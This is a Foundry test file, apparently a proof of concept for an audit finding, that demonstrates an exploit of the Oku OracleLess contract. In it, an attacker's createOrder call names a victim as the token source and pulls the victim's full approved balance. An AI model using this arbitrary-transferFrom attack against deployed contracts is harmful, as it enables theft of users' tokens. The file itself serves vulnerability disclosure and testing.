// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/oku/contracts/automatedTrigger/OracleLess.sol";
import "../src/oku/contracts/automatedTrigger/AutomationMaster.sol";
import "../src/oku/contracts/interfaces/openzeppelin/IERC20.sol";

contract MockOrderToken is IERC20 {
    string public constant name = "Order token";
    string public constant symbol = "ORD";
    uint8 public constant decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; }
    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true;
    }
    function transfer(address to, uint256 amount) external override returns (bool) {
        balanceOf[msg.sender] -= amount; balanceOf[to] += amount; emit Transfer(msg.sender, to, amount); return true;
    }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount; balanceOf[to] += amount; emit Transfer(from, to, amount); return true;
    }
}

contract PoC_44378 is Test {
    OracleLess oracleLess;
    MockOrderToken tokenIn;
    MockOrderToken tokenOut;
    AutomationMaster master;
    address victim = address(0xA11CE);
    address attacker = address(0xB0B);

    function setUp() public {
        master = new AutomationMaster();
        oracleLess = new OracleLess(master, IPermit2(address(0)));
        tokenIn = new MockOrderToken();
        tokenOut = new MockOrderToken();
        tokenIn.mint(victim, 100 ether);
        vm.prank(victim);
        tokenIn.approve(address(oracleLess), type(uint256).max);
    }

    function test_attacker_can_use_victim_as_transferFrom_owner() public {
        vm.prank(attacker);
        oracleLess.createOrder(
            tokenIn,
            tokenOut,
            100 ether,
            0,
            victim,
            0,
            false,
            ""
        );

        assertEq(tokenIn.balanceOf(victim), 0);
        assertEq(tokenIn.balanceOf(address(oracleLess)), 100 ether);
    }
}
